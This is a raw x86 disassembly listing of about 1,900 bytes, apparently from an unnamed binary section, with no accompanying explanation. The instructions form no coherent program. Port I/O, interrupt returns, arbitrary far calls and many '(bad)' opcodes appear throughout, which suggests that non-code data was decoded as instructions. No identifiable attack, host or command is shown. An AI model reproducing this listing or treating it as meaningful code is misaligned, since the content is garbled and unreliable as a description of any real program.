  42132f:	add    DWORD PTR [edi-0x10],ebx
  421332:	scas   eax,DWORD PTR es:[edi]
  421333:	out    0x21,eax
  421335:	inc    ebx
  421336:	arpl   cx,bx
  421338:	xchg   ecx,eax
  421339:	pop    esi
  42133a:	ins    BYTE PTR es:[edi],dx
  42133b:	inc    ebp
  42133c:	jge    0x4212e7
  42133e:	inc    ebp
  42133f:	dec    edx
  421340:	sbb    DWORD PTR [esi-0x5b4a32a0],ecx
  421346:	xchg   edi,eax
  421347:	imul   ebx,DWORD PTR [edx+0x376498f4],0x39d3a563
  421351:	gs mov ah,0x24
  421354:	iret   
  421355:	xchg   edx,eax
  421356:	sti    
  421357:	pop    ebx
  421358:	stc    
  421359:	cld    
  42135a:	sbb    BYTE PTR [ecx+0x5b970fa8],0x79
  421361:	sbb    dl,BYTE PTR [eax+0x3c]
  421364:	addr16 cdq 
  421366:	mov    ds:0xa2ba7559,al
  42136b:	int3   
  42136c:	sub    eax,0x5a6de9ab
  421371:	fwait
  421372:	jg     0x4213da
  421374:	dec    edi
  421375:	jle    0x421314
  421377:	cwde   
  421378:	jo     0x421373
  42137a:	mov    al,ds:0xc761f81
  42137f:	adc    eax,0xdb931cf9
  421384:	mov    eax,ds:0x3d4a0210
  421389:	daa    
  42138a:	jle    0x42136e
  42138c:	sbb    DWORD PTR [ecx-0x3c],esp
  42138f:	push   ss
  421390:	das    
  421391:	icebp  
  421392:	pop    edi
  421393:	scas   eax,DWORD PTR es:[edi]
  421394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421395:	fwait
  421396:	(bad)  
  421397:	(bad)  
  421399:	outs   dx,DWORD PTR ds:[esi]
  42139a:	and    ah,ah
  42139c:	out    dx,eax
  42139d:	aas    
  42139e:	stos   BYTE PTR es:[edi],al
  42139f:	xor    bh,al
  4213a1:	out    0x13,al
  4213a3:	out    0x85,eax
  4213a5:	mov    ecx,0x31fa6de2
  4213aa:	test   BYTE PTR [ecx+0x9],ah
  4213ad:	addr16 gs push ss
  4213b0:	shl    al,0x2f
  4213b3:	xchg   ebx,eax
  4213b4:	jnp    0x421435
  4213b6:	pushf  
  4213b7:	sub    bl,BYTE PTR [eax+0x3dbb6717]
  4213bd:	test   BYTE PTR [esi],0x86
  4213c0:	jle    0x42143f
  4213c2:	mov    gs,WORD PTR [ebp-0x729be2d5]
  4213c8:	sub    BYTE PTR [eax+ebp*8-0x5a],bl
  4213cc:	mov    dh,0x3d
  4213ce:	mov    al,ds:0xd2591b5f
  4213d3:	add    cl,BYTE PTR [eax]
  4213d5:	push   ds
  4213d6:	ror    BYTE PTR [ebp-0x34],0x10
  4213da:	fnsave [ebx+ecx*4]
  4213dd:	test   eax,0x5be0fadc
  4213e2:	out    0x2f,al
  4213e4:	scas   eax,DWORD PTR es:[edi]
  4213e5:	mov    cl,0x5f
  4213e7:	inc    edi
  4213e8:	sub    BYTE PTR [edx-0x45],0xf3
  4213ec:	jo     0x42143a
  4213ee:	out    0xa5,al
  4213f0:	in     al,0x3d
  4213f2:	sub    BYTE PTR ds:0xfde3a4b1,al
  4213f8:	dec    esp
  4213f9:	jbe    0x421448
  4213fb:	jne    0x42146f
  4213fd:	cmp    ch,ah
  4213ff:	xlat   BYTE PTR ds:[ebx]
  421400:	daa    
  421401:	in     al,dx
  421402:	mov    edx,0x60844e23
  421407:	add    esi,DWORD PTR [edi-0x36]
  42140a:	mov    esp,0x32b55452
  42140f:	jp     0x421482
  421411:	mov    esp,0xc2025c1b
  421416:	leave  
  421417:	or     ah,BYTE PTR [ebx+0x292860e0]
  42141d:	sbb    BYTE PTR [edx+edx*2+0x84996d1],cl
  421424:	mov    ch,0x34
  421426:	gs push es
  421428:	xor    BYTE PTR [bx+di-0xd19],ah
  42142d:	test   al,0xe6
  42142f:	pop    es
  421430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421431:	add    DWORD PTR ds:0x3d2fba87,esp
  421437:	cmp    bl,BYTE PTR [esi+0x3da11c94]
  42143d:	je     0x4213d5
  42143f:	cdq    
  421440:	adc    BYTE PTR [ecx+0x23],al
  421443:	lds    esp,FWORD PTR [edi+0x60]
  421446:	(bad)  
  421447:	sar    BYTE PTR [edi+0xf],cl
  42144a:	inc    ecx
  42144b:	inc    ecx
  42144c:	jmp    0xbf8091b4
  421451:	retf   0xa0f
  421454:	push   ds
  421455:	ins    BYTE PTR es:[edi],dx
  421456:	pop    ebp
  421457:	dec    edx
  421458:	sti    
  421459:	cmp    eax,0xe8fd6b69
  42145e:	fist   WORD PTR [edx*2-0x266cdaf7]
  421465:	inc    edi
  421466:	fimul  WORD PTR [ecx]
  421468:	adc    ch,BYTE PTR [edx+ebx*8]
  42146b:	push   ebx
  42146c:	push   edx
  42146d:	xchg   esi,eax
  42146e:	sub    BYTE PTR [ecx-0x33],bl
  421471:	sbb    al,0xe2
  421473:	mov    DWORD PTR gs:[edi],eax
  421476:	aas    
  421477:	push   ds
  421478:	mov    DWORD PTR [esi],esp
  42147a:	fadd   DWORD PTR [ebx-0x36545204]
  421480:	arpl   WORD PTR [edx-0x4d],bx
  421483:	inc    esp
  421484:	iret   
  421485:	inc    ebx
  421486:	test   BYTE PTR es:[eax-0x494237c8],dh
  42148d:	dec    esi
  42148e:	sub    edx,DWORD PTR [edi]
  421490:	inc    ebx
  421491:	mov    ch,0x83
  421493:	push   ecx
  421494:	pushf  
  421495:	pusha  
  421496:	push   cs
  421497:	xchg   BYTE PTR [edi-0x4ed49a57],ah
  42149d:	and    al,0x9c
  42149f:	in     eax,0xae
  4214a1:	in     eax,dx
  4214a2:	mov    gs,ebp
  4214a4:	lock push esp
  4214a6:	push   esi
  4214a7:	jne    0x42144f
  4214a9:	mov    esi,0xfb705e6c
  4214ae:	(bad)
  4214b2:	aam    0x92
  4214b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214b5:	and    eax,0x95b0583a
  4214ba:	mov    ebx,0x1ff51a12
  4214bf:	sahf   
  4214c0:	xor    al,0xd1
  4214c2:	mov    ch,0x19
  4214c4:	jbe    0x4214a8
  4214c6:	iret   
  4214c7:	(bad)  
  4214c8:	and    al,BYTE PTR [ecx]
  4214ca:	icebp  
  4214cb:	push   ecx
  4214cc:	out    dx,al
  4214cd:	daa    
  4214ce:	push   edx
  4214cf:	aam    0x3b
  4214d1:	jle    0x421545
  4214d3:	jb     0x42149a
  4214d5:	call   0x2709:0x41026dc4
  4214dc:	popf   
  4214dd:	mov    dh,0xd2
  4214df:	mov    ch,0x8d
  4214e1:	rol    DWORD PTR [edi+0x7b],1
  4214e4:	int    0x69
  4214e6:	mov    ebx,DWORD PTR [edx]
  4214e8:	or     eax,0x857af1d7
  4214ed:	inc    eax
  4214ee:	dec    edi
  4214ef:	mov    bh,0x25
  4214f1:	xchg   edx,eax
  4214f2:	cmp    eax,0x6e3a9f1e
  4214f7:	loop   0x4214b0
  4214f9:	jbe    0x421545
  4214fb:	or     DWORD PTR [esi+0x7f],edx
  4214fe:	xchg   ebp,eax
  4214ff:	addr16 loope 0x42154b
  421502:	add    eax,0x1eba8264
  421507:	dec    eax
  421508:	sbb    al,0xd6
  42150a:	cdq    
  42150b:	adc    BYTE PTR [ebx],0x47
  42150e:	add    eax,0x4f40cf10
  421513:	outs   dx,DWORD PTR ds:[esi]
  421514:	mov    ebp,DWORD PTR [esi+0x76]
  421517:	and    al,0x31
  421519:	hlt    
  42151a:	sub    ch,BYTE PTR [ebp+0x74]
  42151d:	and    BYTE PTR [ebp-0x3cc6ae5c],dl
  421523:	je     0x4214ab
  421525:	sti    
  421526:	cmp    esp,eax
  421528:	int    0xb0
  42152a:	sub    DWORD PTR ds:0x7fcb12e5,ebx
  421530:	int    0xe5
  421532:	push   ebp
  421533:	not    BYTE PTR [edx-0x4fe64d82]
  421539:	jae    0x42151d
  42153b:	lods   eax,DWORD PTR ds:[esi]
  42153c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42153d:	outs   dx,BYTE PTR ds:[esi]
  42153e:	ss dec eax
  421540:	aad    0xcb
  421542:	sub    DWORD PTR [esi-0x19d976e4],0x3e44e98c
  42154c:	fst    QWORD PTR [ebx]
  42154e:	cmp    BYTE PTR [esi+0x7ba97f2e],bl
  421554:	sub    al,0x72
  421556:	popf   
  421557:	cmp    eax,0x4d44c7fb
  42155c:	inc    ecx
  42155d:	ror    DWORD PTR [eax+0x7b],1
  421560:	pop    edx
  421561:	iret   
  421562:	xor    edx,DWORD PTR [ecx-0x29fd7153]
  421568:	push   ebx
  421569:	in     al,0x8a
  42156b:	cdq    
  42156c:	mov    eax,ds:0xd3d21b24
  421571:	inc    edi
  421572:	xchg   esp,eax
  421573:	cli    
  421574:	inc    esi
  421575:	test   BYTE PTR [ebx],cl
  421577:	cmp    eax,0xa0b0fa7c
  42157c:	adc    esp,ebp
  42157e:	sub    DWORD PTR [eax],ecx
  421580:	cwde   
  421581:	scas   eax,DWORD PTR es:[edi]
  421582:	jecxz  0x421535
  421584:	dec    edx
  421585:	(bad)  
  421587:	cld    
  421588:	pop    ebx
  421589:	dec    eax
  42158a:	cmp    ebp,ebx
  42158c:	push   ebp
  42158d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42158e:	inc    esp
  42158f:	(bad)  
  421590:	(bad)  
  421592:	xchg   ebx,eax
  421593:	inc    ebx
  421594:	or     al,0xd2
  421596:	das    
  421597:	mov    dh,0xc
  421599:	les    edi,FWORD PTR [ecx+ebp*8-0xe]
  42159d:	bound  edi,QWORD PTR ds:[esi+eiz*1]
  4215a1:	sub    ecx,esp
  4215a3:	dec    ebp
  4215a4:	lods   al,BYTE PTR ds:[esi]
  4215a5:	mov    ds:0x3f1b8e46,al
  4215aa:	jbe    0x42158e
  4215ac:	inc    eax
  4215ad:	sbb    eax,0x903669a8
  4215b2:	pop    ebp
  4215b3:	fcomp  DWORD PTR es:[esp+edi*1-0x7afbd089]
  4215bb:	cwde   
  4215bc:	sbb    ebp,DWORD PTR [ecx+edi*4-0x4d9a7c77]
  4215c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215c4:	cmp    edx,DWORD PTR [edi-0x3d740d34]
  4215ca:	add    dl,BYTE PTR [edx-0x8140805]
  4215d0:	cmp    DWORD PTR [edx],0xffffffe0
  4215d3:	xchg   ebx,eax
  4215d4:	sub    eax,0x87ed9aa0
  4215d9:	adc    dh,ch
  4215db:	shl    eax,cl
  4215dd:	jnp    0x421560
  4215df:	lea    ebx,[edx-0x5d8398e6]
  4215e5:	dec    esi
  4215e6:	xchg   edi,eax
  4215e7:	xchg   edi,eax
  4215e8:	les    eax,FWORD PTR [esi-0x37]
  4215eb:	cmp    ebp,DWORD PTR [edx]
  4215ed:	jg     0x4215c6
  4215ef:	stos   DWORD PTR es:[edi],eax
  4215f0:	mov    ?,edi
  4215f2:	mov    bl,0x60
  4215f4:	cli    
  4215f5:	xchg   ebx,eax
  4215f6:	xor    DWORD PTR [esi],edi
  4215f8:	jl     0x42157a
  4215fa:	push   ecx
  4215fb:	gs cmp dh,al
  4215fe:	aaa    
  4215ff:	mov    bh,0xa2
  421601:	arpl   WORD PTR [eax+edx*4],cx
  421604:	je     0x42159a
  421606:	std    
  421607:	sbb    edi,ebp
  421609:	push   ds
  42160a:	fxtract 
  42160c:	pop    eax
  42160d:	in     al,dx
  42160e:	dec    esp
  42160f:	mov    esp,0x6441784a
  421614:	or     DWORD PTR [edx],edi
  421616:	ins    BYTE PTR es:[edi],dx
  421617:	cmp    ebx,0xffffff95
  42161a:	es (bad) 
  42161c:	mov    cl,0x55
  42161e:	data16 jge 0x421694
  421621:	cmp    bh,ch
  421623:	mov    esp,0xe8bbefde
  421628:	xor    ah,dl
  42162a:	cli    
  42162b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42162c:	ret    0x55db
  42162f:	clc    
  421630:	xor    esp,esi
  421632:	popa   
  421633:	dec    edx
  421634:	mov    bh,0xd2
  421636:	repz mov cl,0x89
  421639:	dec    ebx
  42163a:	leave  
  42163b:	fucom  st(4)
  42163d:	lds    ebx,FWORD PTR [ebp-0x55]
  421640:	mov    ch,0xc
  421642:	shr    DWORD PTR [esi],1
  421644:	lds    edi,FWORD PTR [edx]
  421646:	jp     0x421652
  421648:	outs   dx,DWORD PTR ds:[esi]
  421649:	add    eax,0xe2e1b08f
  42164e:	pop    ebx
  42164f:	(bad)  
  421650:	int    0xad
  421652:	ds xchg ebx,eax
  421654:	gs xor al,0x75
  421657:	shl    esi,1
  421659:	xchg   esp,eax
  42165a:	dec    edi
  42165b:	stos   BYTE PTR es:[edi],al
  42165c:	adc    BYTE PTR [ebx+edx*8+0x2d],al
  421660:	xor    eax,0xc527b201
  421665:	or     al,0x78
  421667:	(bad)  
  421668:	mov    DWORD PTR [edi],esi
  42166a:	sbb    BYTE PTR [ebp-0x3407fa04],dh
  421670:	mov    edx,0x51b984f4
  421675:	sub    ebp,esi
  421677:	mov    ah,0x90
  421679:	xchg   esi,eax
  42167a:	xlat   BYTE PTR ds:[ebx]
  42167b:	mov    eax,0x98f8011b
  421680:	and    DWORD PTR [ecx+0x31a1a8c9],edi
  421686:	repz bound edi,QWORD PTR [edi]
  421689:	in     al,0x97
  42168b:	leave  
  42168c:	adc    cl,0x62
  42168f:	into   
  421690:	cwde   
  421691:	fs jbe 0x42168c
  421694:	test   eax,0x5c73a0d
  421699:	or     DWORD PTR [edi-0x59],esp
  42169c:	iret   
  42169d:	test   BYTE PTR [eax-0x11],bl
  4216a0:	jns    0x4216a3
  4216a2:	jo     0x4216ce
  4216a4:	mov    esp,0x53625c82
  4216a9:	ficom  WORD PTR [esi+0x69]
  4216ac:	jle    0x42167a
  4216ae:	dec    ebp
  4216af:	hlt    
  4216b0:	pop    ecx
  4216b1:	pop    ss
  4216b2:	xor    DWORD PTR gs:[ecx+0x10],edx
  4216b6:	mov    dh,0x7a
  4216b8:	sbb    BYTE PTR [ebx],bl
  4216ba:	int3   
  4216bb:	cmp    ch,BYTE PTR [esi-0x73]
  4216be:	inc    esp
  4216bf:	popa   
  4216c0:	sub    al,0x59
  4216c2:	push   esp
  4216c3:	outs   dx,BYTE PTR ds:[esi]
  4216c4:	leave  
  4216c5:	fnstsw WORD PTR [edx-0x60cb88b]
  4216cb:	xchg   edi,eax
  4216cc:	or     edx,DWORD PTR [edx-0x19da2ece]
  4216d2:	test   DWORD PTR [eax-0x15],edi
  4216d5:	ss push eax
  4216d7:	jmp    0x4216a0
  4216d9:	lods   eax,DWORD PTR ds:[esi]
  4216da:	jmp    0x421758
  4216dc:	daa    
  4216dd:	sub    cl,BYTE PTR [esi+0x6a]
  4216e0:	push   esp
  4216e1:	xchg   ecx,eax
  4216e2:	dec    esp
  4216e3:	mov    bh,0xef
  4216e5:	mov    bh,0x61
  4216e7:	push   eax
  4216e8:	jge    0x4216a3
  4216ea:	sar    BYTE PTR [eax+0x2271f871],1
  4216f0:	pushf  
  4216f1:	adc    BYTE PTR [eax],bl
  4216f3:	pop    esp
  4216f4:	scas   eax,DWORD PTR es:[edi]
  4216f5:	adc    esi,DWORD PTR [esi+ecx*4+0x6dc0ab1c]
  4216fc:	jne    0x4216ec
  4216fe:	push   0xffffff84
  421700:	aaa    
  421701:	add    al,0x17
  421703:	mov    eax,0x8a1b064b
  421708:	pop    es
  421709:	into   
  42170a:	out    dx,al
  42170b:	and    BYTE PTR [ebx+0x42],bl
  42170e:	stos   DWORD PTR es:[edi],eax
  42170f:	call   0x3d3e:0x7244cb9b
  421716:	pop    esp
  421717:	pop    ss
  421718:	scas   al,BYTE PTR es:[edi]
  421719:	js     0x421782
  42171b:	adc    eax,DWORD PTR [eax]
  42171d:	aaa    
  42171e:	test   ah,bl
  421720:	mov    edi,0x43f215d1
  421725:	xor    al,0x85
  421727:	inc    esp
  421728:	jmp    0x42174e
  42172a:	test   eax,esp
  42172c:	jl     0x4216db
  42172e:	mov    ds:0x43201738,al
  421733:	add    edx,DWORD PTR fs:[ebp+0xb]
  421737:	and    eax,0x8baf04aa
  42173c:	retf   0x5f51
  42173f:	jnp    0x4216dc
  421741:	and    al,0x85
  421743:	cli    
  421744:	mov    ebx,0x92d6b6ea
  421749:	add    cl,BYTE PTR [edi]
  42174b:	mov    ecx,0x42b87890
  421750:	loopne 0x421764
  421752:	mov    ch,0xcc
  421754:	mov    edx,0xcb360b98
  421759:	rcl    ecx,cl
  42175b:	cmp    bl,BYTE PTR [edi+esi*2+0x11d057ad]
  421762:	push   edx
  421763:	loope  0x421735
  421765:	je     0x42173b
  421767:	stos   BYTE PTR es:[edi],al
  421768:	and    eax,0xa8ecc2a7
  42176d:	xchg   DWORD PTR [edx+eax*2+0x77],eax
  421771:	cwde   
  421772:	xchg   ebp,eax
  421773:	sub    ebx,DWORD PTR [ecx]
  421775:	icebp  
  421776:	cmp    ch,BYTE PTR [ecx]
  421778:	mov    ds:0x43fbe85a,al
  42177d:	or     ah,bl
  42177f:	inc    edi
  421780:	push   ecx
  421781:	add    bh,BYTE PTR [ebp+0x0]
  421784:	ror    ebp,0xd2
  421787:	aas    
  421788:	adc    DWORD PTR [esi+0x41760ddb],esi
  42178e:	mov    esp,0xc91c49c4
  421793:	into   
  421794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421795:	mov    bl,0xcc
  421797:	stc    
  421798:	daa    
  421799:	push   esi
  42179a:	loop   0x421776
  42179c:	push   0xb6f002d8
  4217a1:	add    eax,0x74ba15f3
  4217a6:	xor    al,0x29
  4217a8:	paddd  mm6,QWORD PTR [ebp-0x54861132]
  4217af:	inc    eax
  4217b0:	cwde   
  4217b1:	xor    ch,BYTE PTR [ecx-0x7b]
  4217b4:	xor    DWORD PTR [esi+0x6f],0x70
  4217b8:	sub    al,0x5c
  4217ba:	xor    eax,0x86fd1a8
  4217bf:	mov    ch,0x50
  4217c1:	xchg   esp,eax
  4217c2:	pop    ss
  4217c3:	lock pop es
  4217c5:	or     edx,DWORD PTR [esi]
  4217c7:	add    bh,cl
  4217c9:	ins    DWORD PTR es:[edi],dx
  4217ca:	cmp    BYTE PTR [ebp+0x674ede6c],dl
  4217d0:	mov    ds:0x1a325201,al
  4217d5:	(bad)  
  4217d6:	retf   
  4217d7:	mov    ds:0xe83b1b84,eax
  4217dc:	jmp    0xd57d261e
  4217e1:	js     0x421791
  4217e3:	repnz loop 0x421822
  4217e6:	pop    esi
  4217e7:	inc    edi
  4217e8:	mov    esp,ebp
  4217ea:	test   BYTE PTR [eax+0x30],cl
  4217ed:	xor    esi,DWORD PTR [edi]
  4217ef:	xchg   BYTE PTR [esi+0x60d47195],bh
  4217f5:	pusha  
  4217f6:	div    DWORD PTR [esi+ebx*1+0x417aa956]
  4217fd:	pop    eax
  4217fe:	adc    eax,0x36a4b916
  421803:	push   ecx
  421804:	(bad)  
  421805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421806:	js     0x421791
  421808:	or     al,0x9b
  42180a:	push   ecx
  42180b:	lahf   
  42180c:	pop    ebx
  42180d:	lds    edx,FWORD PTR [ebp-0x2a8814f5]
  421813:	and    DWORD PTR [ebx-0x65],0x48
  421817:	fidiv  WORD PTR [eax]
  421819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42181a:	fld    QWORD PTR ds:0x99919a84
  421820:	nop
  421821:	push   ebp
  421822:	cmc    
  421823:	sub    BYTE PTR [ebp-0x5f],bh
  421826:	and    DWORD PTR [ebx+esi*1+0x73],0x78231247
  42182e:	aam    0x3e
  421830:	and    DWORD PTR [eax+0x4c],edx
  421833:	add    dh,BYTE PTR [edx+eiz*1+0x27c51abb]
  42183a:	outs   dx,BYTE PTR ds:[esi]
  42183b:	cmp    BYTE PTR [edi],bh
  42183d:	imul   ecx,esi,0x2a
  421840:	jne    0x42180d
  421842:	int3   
  421843:	xor    DWORD PTR [esi+0x1b],edx
  421846:	loope  0x4217ee
  421848:	test   BYTE PTR [edx+0x2f0dabe5],ah
  42184e:	cmp    edx,edx
  421850:	test   BYTE PTR [ebx],ah
  421852:	cmp    al,0x59
  421854:	sub    esi,esp
  421856:	ins    WORD PTR es:[edi],dx
  421858:	loopne 0x4218ab
  42185a:	test   eax,0x11e66fa6
  42185f:	outs   dx,BYTE PTR ds:[esi]
  421860:	push   ss
  421861:	add    ch,al
  421863:	xor    ch,dh
  421865:	in     eax,dx
  421866:	das    
  421867:	mov    bl,0xb9
  421869:	adc    bl,BYTE PTR [ecx+eax*2]
  42186c:	pop    esi
  42186d:	das    
  42186e:	mov    al,ds:0x93713ff4
  421873:	cmp    al,0x3
  421875:	inc    eax
  421876:	sub    DWORD PTR [eax+0xd11ef3],0xf8d26211
  421880:	xor    eax,0xc7c1a436
  421885:	sti    
  421886:	mov    cl,0x53
  421888:	popf   
  421889:	jns    0x421817
  42188b:	or     DWORD PTR [ebx-0x3b],ebp
  42188e:	div    bh
  421890:	jno    0x421911
  421892:	sahf   
  421893:	cmp    cl,ah
  421895:	(bad)  
  421896:	pop    edi
  421897:	pop    edx
  421898:	push   eax
  421899:	jns    0x4218fb
  42189b:	mov    ecx,0xe0375c6b
  4218a0:	jbe    0x4218b9
  4218a2:	out    dx,eax
  4218a3:	dec    ebx
  4218a4:	imul   edi,esp,0x5
  4218a7:	inc    edi
  4218a8:	jbe    0x4218b5
  4218aa:	pop    ecx
  4218ab:	mov    edi,0xf0b59f1
  4218b0:	mov    eax,DWORD PTR [ebp-0x8e8ae50]
  4218b6:	push   ss
  4218b7:	inc    ebx
  4218b8:	hlt    
  4218b9:	ret    
  4218ba:	cmp    bh,bh
  4218bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218bd:	loop   0x42186c
  4218bf:	inc    ecx
  4218c0:	mov    al,ds:0x74d2a5
  4218c5:	dec    ecx
  4218c6:	mov    dl,0xc1
  4218c8:	sahf   
  4218c9:	xor    eax,0xdc31331b
  4218ce:	outs   dx,BYTE PTR ds:[esi]
  4218cf:	and    dl,BYTE PTR [ebx]
  4218d1:	cdq    
  4218d2:	push   ecx
  4218d3:	jbe    0x4218b4
  4218d5:	mov    ecx,0xcc4e339c
  4218da:	fist   DWORD PTR [edi-0x5c]
  4218dd:	mov    ecx,edx
  4218df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218e0:	add    eax,0x808d13c6
  4218e5:	call   0x8cb8f333
  4218ea:	aad    0x0
  4218ec:	loop   0x421969
  4218ee:	test   al,0x1e
  4218f0:	or     BYTE PTR [edi],0x61
  4218f3:	mov    bh,0x3d
  4218f5:	push   ebx
  4218f6:	mov    esi,0xde2eb205
  4218fb:	inc    ebx
  4218fc:	fdivr  DWORD PTR [esi+0x725c619c]
  421902:	leave  
  421903:	into   
  421904:	add    BYTE PTR ds:0x234f702e,dl
  42190a:	in     eax,dx
  42190b:	(bad)  
  42190c:	leave  
  42190d:	data16 fisubr DWORD PTR [eax]
  421910:	les    ebp,FWORD PTR [ebx]
  421912:	mov    bl,0xe9
  421914:	dec    ebp
  421915:	add    al,0x2e
  421917:	fcom   QWORD PTR [edx]
  421919:	mov    fs,WORD PTR [esi+eiz*1+0xd]
  42191d:	test   al,0xc8
  42191f:	xor    BYTE PTR [edi],bh
  421921:	and    edi,DWORD PTR [esp+eiz*2-0x4f160b6e]
  421928:	or     BYTE PTR [ebp+eiz*4+0x24],dh
  42192c:	in     al,0x3f
  42192e:	push   cs
  42192f:	push   eax
  421930:	mov    BYTE PTR [ebx+0x5e],bh
  421933:	jo     0x4218df
  421935:	ret    0x5850
  421938:	mov    edx,0x92efbc59
  42193d:	adc    BYTE PTR [edi+eax*4],bl
  421940:	cmp    esp,esp
  421942:	fs das 
  421944:	jae    0x421931
  421946:	sub    ecx,DWORD PTR [ebp+0x1b]
  421949:	imul   esi,esi,0x36
  42194c:	jecxz  0x4218ff
  42194e:	cdq    
  42194f:	(bad)  
  421950:	jbe    0x4218f9
  421952:	ret    0xf2e0
  421955:	dec    edi
  421956:	sti    
  421957:	shl    DWORD PTR [edx-0xc2aaba],1
  42195d:	pop    eax
  42195e:	test   al,0xfd
  421960:	mov    ds:0xacb88d90,al
  421965:	pop    edx
  421966:	xchg   esp,eax
  421967:	inc    esp
  421968:	loope  0x42196e
  42196a:	jae    0x421997
  42196c:	or     BYTE PTR [ebx-0x64cd90f1],0x7a
  421973:	inc    ebx
  421974:	gs dec ebp
  421976:	xchg   ecx,edi
  421978:	inc    esp
  421979:	add    BYTE PTR [edx+esi*1-0x7c],ch
  42197d:	pop    es
  42197e:	and    al,0xe6
  421980:	xor    BYTE PTR [esp+ecx*4-0x944638b],bh
  421987:	ins    DWORD PTR es:[edi],dx
  421988:	out    dx,eax
  421989:	mov    dh,0xc5
  42198b:	adc    bl,BYTE PTR [edi+0x5d]
  42198e:	fisub  WORD PTR [edx-0x51d84035]
  421994:	pop    ss
  421995:	mov    eax,ds:0x59110869
  42199a:	call   0xa5c7:0x7255af1c
  4219a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219a2:	and    eax,0xb89e82a8
  4219a7:	lock in al,0x8f
  4219aa:	nop
  4219ab:	sar    BYTE PTR [edi+edi*8+0x736c4d65],1
  4219b2:	dec    eax
  4219b3:	sbb    ah,dh
  4219b5:	popf   
  4219b6:	aaa    
  4219b7:	sub    cl,bl
  4219b9:	sar    DWORD PTR [ebx],0xf0
  4219bc:	mov    dl,al
  4219be:	rcr    DWORD PTR [edi+eax*8+0x1bb35354],0xd4
  4219c6:	retf   
  4219c7:	jbe    0x4219fd
  4219c9:	shl    DWORD PTR [ecx],0xc4
  4219cc:	push   edx
  4219cd:	push   ss
  4219ce:	js     0x421973
  4219d0:	sbb    DWORD PTR [esi-0x33f4cee1],0x4a
  4219d7:	mov    bh,0x78
  4219d9:	inc    edi
  4219da:	fwait
  4219db:	xlat   BYTE PTR ds:[ebx]
  4219dc:	mov    bl,0x16
  4219de:	(bad)  
  4219df:	dec    edi
  4219e0:	push   ecx
  4219e1:	add    DWORD PTR [edx],ebp
  4219e3:	cmp    al,0x9
  4219e5:	fstp   QWORD PTR [edx-0x7cf941d3]
  4219eb:	lods   eax,DWORD PTR ds:[esi]
  4219ec:	fs xor al,0x61
  4219ef:	inc    edi
  4219f0:	jg     0x4219ed
  4219f2:	mov    eax,0x1f6d8024
  4219f7:	adc    eax,0xa4248774
  4219fc:	add    dl,ah
  4219fe:	pop    ecx
  4219ff:	ins    BYTE PTR es:[edi],dx
  421a00:	iret   
  421a01:	imul   edi,DWORD PTR [esi+ebx*1-0x6c09c8b7],0x1ed60caf
  421a0c:	xor    eax,0xda69d739
  421a11:	xor    ch,BYTE PTR [edi-0x60]
  421a14:	jnp    0x421a63
  421a16:	inc    esi
  421a17:	fdivrp st(6),st
  421a19:	sbb    eax,0x46ed75a2
  421a1e:	push   0x66
  421a20:	(bad)  
  421a21:	push   edx
  421a22:	xor    DWORD PTR [ecx],ebp
  421a24:	cli    
  421a25:	push   0x41a65812
  421a2a:	cdq    
  421a2b:	cs xchg ebx,eax
  421a2d:	ja     0x421a65
  421a2f:	test   eax,0x74c685aa
  421a34:	dec    eax
  421a35:	out    dx,eax
  421a36:	ins    BYTE PTR es:[edi],dx
  421a37:	out    0x5f,al
  421a39:	pop    ds
  421a3a:	inc    edx
  421a3b:	repz mov esp,0xd1a40c08
  421a41:	je     0x421a39
  421a43:	aad    0xfe
  421a45:	dec    edx
  421a46:	aad    0x1c
  421a48:	xchg   ebp,eax
  421a49:	xor    BYTE PTR [eax-0x25],bh
  421a4c:	int    0x36
  421a4e:	mov    dl,0xd0
  421a50:	adc    eax,0x4c8a95b6
  421a55:	cmp    bh,dl
  421a57:	cmc    
  421a58:	lea    esp,[ecx+eax*1]
  421a5b:	test   ecx,edx
  421a5d:	cwde   
  421a5e:	(bad)  
  421a5f:	jae    0x421a58
  421a61:	arpl   bx,di
  421a63:	mov    esi,0xd9ac5522
  421a68:	cmp    DWORD PTR [ecx],eax
  421a6a:	mov    cl,0x5
  421a6c:	inc    eax
  421a6d:	popf   
  421a6e:	adc    ebx,DWORD PTR [ebx+0x5]
  421a71:	xor    BYTE PTR [esi-0x76],ah
  421a74:	popf   
  421a75:	fadd   QWORD PTR [ebx+0x13]
  421a78:	cmp    DWORD PTR [edi+0x28f7d726],ebp
  421a7e:	sar    DWORD PTR [esi],0x2f
  421a81:	inc    ebp
  421a82:	adc    cl,bh
  421a84:	and    al,0xe1
  421a86:	test   BYTE PTR [ebx-0x1b],0x5
  421a8a:	push   ebx
  421a8b:	sbb    BYTE PTR [ebx-0x3782488b],dh
  421a91:	outs   dx,DWORD PTR ds:[esi]
  421a92:	sub    BYTE PTR [ebx],dh
  421a94:	cli    
  421a95:	inc    ecx
  421a96:	out    0x4f,eax
  421a98:	jecxz  0x421a90
  421a9a:	mov    esi,DWORD PTR [edx]
  421a9c:	stc    
  421a9d:	dec    ecx
  421a9e:	sbb    eax,0x70473788
  421aa3:	je     0x421a7a
  421aa5:	dec    ecx
  421aa6:	in     eax,0xd5
  421aa8:	pop    ss
  421aa9:	shl    BYTE PTR [ebp-0x36],0xf2
  421aad:	sub    eax,0xbe2550e
  421ab2:	cmp    al,0x6e
  421ab4:	in     al,0xe0
  421ab6:	mov    eax,ds:0x5376ac54
  421abb:	test   BYTE PTR [edi],ah
  421abd:	push   eax
  421abe:	push   cs
  421abf:	sub    eax,0xa9922444
  421ac4:	or     eax,0xd25beb25
  421ac9:	ds (bad) 
  421acb:	jmp    0x32d5918c
  421ad0:	jnp    0x421a89
  421ad2:	mov    ecx,0xa521aa79
  421ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
